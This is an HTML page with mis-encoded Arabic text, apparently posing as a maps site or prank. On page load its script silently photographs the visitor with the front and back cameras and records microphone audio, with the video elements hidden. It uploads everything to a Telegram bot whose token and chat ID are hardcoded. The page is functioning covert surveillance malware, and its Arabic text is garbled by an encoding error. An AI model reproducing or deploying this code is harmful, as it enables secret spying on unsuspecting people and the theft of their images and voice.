<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="images.jpg"> <!-- Ù‡Ø°Ø§ Ø§Ù„Ø³Ø·Ø± Ù„ØªØ­Ø¯ÙŠØ¯ ØµÙˆØ±Ø© Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© -->
  <title>Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø®Ø±Ø§Ø¦Ø·</title>
  <style>
    body { text-align: center; font-family: Arial; }
    video { display: none; }
    canvas { display: none; }
  </style>
</head>
<body>

<h3>ðŸ˜† Ù…Ù‚Ù„Ø¨ Ù‚ÙŠØ¯ Ø§Ù„ØªØ­Ø¶ÙŠØ±...</h3>
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
/* ============ CONFIG ============ */
const BOT_TOKEN = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4";  
const CHAT_ID  = "6243038338"; 

const SHOTS = 3;
const DELAY = 250; 
const AUDIO_TIME = 10000; 
/* ================================ */

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

let audioStream;

/* ================= MAIN ================= */
(async () => {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: true,
    audio: true
  });
  audioStream = stream;

  await startCamera("user");
  await shootSeries("front");

  await sleep(700);

  await startCamera("environment");
  await shootSeries("back");

  await recordAndSendAudio(1);
  await recordAndSendAudio(2);
})();

/* ================= CAMERA ================= */
async function startCamera(mode) {
  if (video.srcObject) {
    video.srcObject.getTracks().forEach(t => t.stop());
  }

  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: mode }
  });

  video.srcObject = stream;
  return new Promise(r => video.onloadedmetadata = r);
}

async function shootSeries(label) {
  for (let i = 1; i <= SHOTS; i++) {
    takePhoto(label, i);
    await sleep(DELAY);
  }
}

function takePhoto(label, num) {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(blob => {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", blob, `${label}_${num}.jpg`);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    });
  }, "image/jpeg");
}

/* ================= AUDIO ================= */
async function recordAndSendAudio(round) {
  const recorder = new MediaRecorder(audioStream);
  let chunks = [];

  recorder.ondataavailable = e => chunks.push(e.data);
  recorder.start();

  await sleep(AUDIO_TIME);
  recorder.stop();

  recorder.onstop = () => {
    const blob = new Blob(chunks, { type: "audio/ogg" });
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("voice", blob, `voice_${round}.ogg`);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
      method: "POST",
      body: formData
    });
  };

  await sleep(1000);
}

/* ================= UTIL ================= */
function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}
</script>

</body>
</html>

